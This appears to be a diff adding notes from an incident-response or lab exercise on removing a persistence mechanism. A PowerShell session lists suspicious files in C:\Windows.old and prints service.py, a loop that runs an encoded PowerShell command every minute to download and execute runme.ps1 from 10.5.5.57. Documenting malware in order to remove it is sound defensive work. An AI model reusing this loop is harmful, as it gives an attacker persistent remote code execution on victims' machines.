@@ -1,0 +1,29 @@
+# Remove persistance mechanism A
+PS C:\> cd Windows.old
+cd Windows.old
+PS C:\Windows.old> dir
+dir
+
+
+    Directory: C:\Windows.old
+
+
+Mode                 LastWriteTime         Length Name                                                                 
+----                 -------------         ------ ----                                                                 
+-a----          9/9/2022   6:05 PM        5117448 explorer.exe                                                         
+-a----         7/31/2022   7:41 PM            410 Helper.deps.json                                                     
+-a----         7/31/2022   7:41 PM           5120 Helper.dll                                                           
+-a----         7/31/2022   7:41 PM         148992 Helper.exe                                                           
+-a----         7/31/2022   7:41 PM            147 Helper.runtimeconfig.json                                            
+-a----          8/1/2022   8:14 PM        1667584 search.exe                                                           
+-a----         7/31/2022   7:41 PM            426 service.py                                                           
+
+
+PS C:\Windows.old> cat service.py
+cat service.py
+import time,subprocess
+
+while True:
+    subprocess.Popen(["C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe", "-EncodedCommand","SQBuAHYAbwBrAGUALQBFAHgAcAByAGUAcwBzAGkAbwBuACAAKAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAcwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAwAC4ANQAuADUALgA1ADcALwByAHUAbgBtAGUALgBwAHMAMQAnACkAKQA="],shell=True)
+    time.sleep(60.0)
+
